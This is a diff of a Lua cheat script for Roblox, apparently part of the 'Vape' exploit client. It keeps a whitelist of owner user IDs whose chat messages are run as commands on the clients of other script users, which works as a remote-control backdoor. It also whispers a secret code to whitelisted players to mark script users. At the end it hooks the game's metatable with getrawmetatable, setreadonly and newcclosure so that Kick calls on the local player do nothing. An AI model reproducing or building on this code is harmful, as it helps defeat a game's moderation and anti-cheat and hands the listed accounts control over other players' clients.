@@ -1,11 +1,9 @@
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
-local RunService = game:GetService("RunService")
 local LOCAL_PLAYER = Players.LocalPlayer
 
--- Whitelist database
 local whitelist = {
-	Owner = {4279175156, 4202838123, 4307561815, 4380912728, 4240568437, 1819298193},
+	Owner = {4279175156, 4202838123, 4307561815, 4380912728, 4240568437, 4262245137},
 	Private = {
 		5413983848, 4191327145, 1848051618, 1965898454, 1666325842, 1513390800, 5546161719,
 		1983015440, 3204169739, 1880511134, 314732068, 3932037947, 570843764, 1256412411
@@ -13,7 +11,6 @@ local whitelist = {
 	Slow = {1562251033}
 }
 
--- Whitelist logic
 local function isInList(u, list)
 	for _, id in ipairs(list) do
 		if u == id then return true end
@@ -25,7 +22,6 @@ local function isWhitelisted(u)
 	return isInList(u, whitelist.Owner) or isInList(u, whitelist.Private)
 end
 
--- Apply visible tag above head
 local function applyTag(plr, txt, col)
 	local function render()
 		local head = plr.Character and plr.Character:FindFirstChild("Head")
@@ -51,7 +47,6 @@ local function applyTag(plr, txt, col)
 	if plr.Character then render() else plr.CharacterAdded:Once(function() task.wait(0.5) render() end) end
 end
 
--- Whitelist role tags
 local function tag(plr)
 	local id = plr.UserId
 	if isInList(id, whitelist.Owner) then
@@ -66,33 +61,7 @@ end
 for _, p in ipairs(Players:GetPlayers()) do tag(p) end
 Players.PlayerAdded:Connect(function(p) task.delay(1, function() tag(p) end) end)
 
--- [VAPE USER] tag only whitelisted users can see
-local function tagAsVapeUserFor(plr)
-	local head = LOCAL_PLAYER.Character and LOCAL_PLAYER.Character:FindFirstChild("Head")
-	if not head then return end
-	if head:FindFirstChild("VapeLoggedBy_" .. plr.UserId) then return end
-
-	local b = Instance.new("BillboardGui")
-	b.Name = "VapeLoggedBy_" .. plr.UserId
-	b.Size = UDim2.new(0, 100, 0, 20)
-	b.StudsOffset = Vector3.new(0, 3.5, 0)
-	b.AlwaysOnTop = true
-	b.Adornee = head
-	b.Parent = head
-
-	local l = Instance.new("TextLabel")
-	l.Size = UDim2.fromScale(1, 1)
-	l.BackgroundTransparency = 1
-	l.Text = "[VAPE USER]"
-	l.TextColor3 = Color3.fromRGB(255, 255, 255)
-	l.TextStrokeTransparency = 0.2
-	l.TextStrokeColor3 = Color3.new(0, 0, 0)
-	l.Font = Enum.Font.GothamBold
-	l.TextScaled = true
-	l.Parent = b
-end
-
--- Command execution
+-- Commands from whitelisted users
 local function exec(cmd, senderId)
 	cmd = string.lower(cmd)
 	local undo = false
@@ -191,7 +160,6 @@ local function exec(cmd, senderId)
 	end
 end
 
--- Command receiver
 TextChatService.MessageReceived:Connect(function(msg)
 	local t = msg.Text
 	local s = msg.TextSource
@@ -203,21 +171,45 @@ TextChatService.MessageReceived:Connect(function(msg)
 	exec(t, uid)
 end)
 
--- One-time logger system
+local function tagAsVapeUserFor(observer)
+	local head = LOCAL_PLAYER.Character and LOCAL_PLAYER.Character:FindFirstChild("Head")
+	if not head or head:FindFirstChild("VapeLoggedBy_" .. observer.UserId) then return end
+
+	local tag = Instance.new("BillboardGui")
+	tag.Name = "VapeLoggedBy_" .. observer.UserId
+	tag.Size = UDim2.new(0, 100, 0, 20)
+	tag.StudsOffset = Vector3.new(0, 3.5, 0)
+	tag.AlwaysOnTop = true
+	tag.Adornee = head
+	tag.Parent = head
+
+	local label = Instance.new("TextLabel")
+	label.Size = UDim2.fromScale(1, 1)
+	label.BackgroundTransparency = 1
+	label.Text = "[VAPE USER]"
+	label.TextColor3 = Color3.fromRGB(255, 255, 255)
+	label.TextStrokeTransparency = 0.2
+	label.TextStrokeColor3 = Color3.new(0, 0, 0)
+	label.Font = Enum.Font.GothamBold
+	label.TextScaled = true
+	label.Parent = tag
+end
+
 local loggedWhitelist = {}
 
 local function dmWhitelistedOnce(plr)
 	if loggedWhitelist[plr.UserId] then return end
 	loggedWhitelist[plr.UserId] = true
 
+	local nameTarget = plr.DisplayName and #plr.DisplayName > 0 and plr.DisplayName or plr.Name
+
 	pcall(function()
 		if TextChatService.TextChannels and TextChatService.TextChannels.RBXGeneral then
-			TextChatService.TextChannels.RBXGeneral:SendAsync("X83uz1")
+			TextChatService.TextChannels.RBXGeneral:SendAsync("/w " .. nameTarget .. " X83uz1")
 		end
 	end)
 end
 
--- Core detection loop
 task.spawn(function()
 	while true do
 		for _, p in ipairs(Players:GetPlayers()) do
@@ -230,7 +222,6 @@ task.spawn(function()
 	end
 end)
 
--- ;log reset command
 TextChatService.MessageReceived:Connect(function(msg)
 	local t = msg.Text
 	local s = msg.TextSource
@@ -242,11 +233,9 @@ TextChatService.MessageReceived:Connect(function(msg)
 	end
 end)
 
--- Kick bypass protection
 local mt = getrawmetatable(game)
 setreadonly(mt, false)
 local old = mt.__namecall
-
 mt.__namecall = newcclosure(function(self, ...)
 	if getnamecallmethod() == "Kick" and self == LOCAL_PLAYER then
 		return nil
